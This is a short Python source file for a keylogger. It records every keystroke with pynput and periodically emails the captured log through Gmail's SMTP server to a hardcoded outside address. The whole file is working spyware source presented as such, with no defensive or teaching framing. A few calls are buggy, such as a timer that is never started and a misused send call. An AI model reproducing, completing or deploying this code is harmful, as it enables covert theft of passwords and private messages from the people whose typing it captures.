from pynput.keyboard import Key, Listener
import smtplib , threading

class MyKeylogger:
    def __init__(self,email,password):
        self.email= email
        self.password= password
        self.log="Start..."

    def on_press(self,keys):
        try:
            current_key=str(keys.char)
        except:
            if keys==Key.space:
                current_key=" "
            elif keys==Key.shift:
                current_key=""
            elif keys==Key.enter:
                current_key="\n"
            else:
                current_key=" "+str(keys)+" "
        self.log = self.log + current_key

    #            In case we want to save data in a file 
    # def write_files(self,keys):
    #     k=str(keys).replace("'","")  
    #     with open ("log.txt",'a')as f:
    #         f.write(k)
    
    def send_mail(self,message):
        server = smtplib.SMTP('smtp.gmail.com',587)
        server.starttls()
        server.login(self.email,self.password)
        server.send_message("hit")
        server.sendmail(self.email,"ranyakobbi@gmail.com",message)
        server.quit()
    
    def report(self):
        self.send_mail("\n\n" + self.log)
        self.log=""
        timer = threading.Timer(180,self.report)
        timer.start

    def main (self):
        with Listener(on_press= self.on_press) as l:
            self.report()
            l.join()   

if __name__ == "__main__":
    keylogger = MyKeylogger("someone@gmail.com","Rto85ddkn") #Fake credentials
    keylogger.main() 
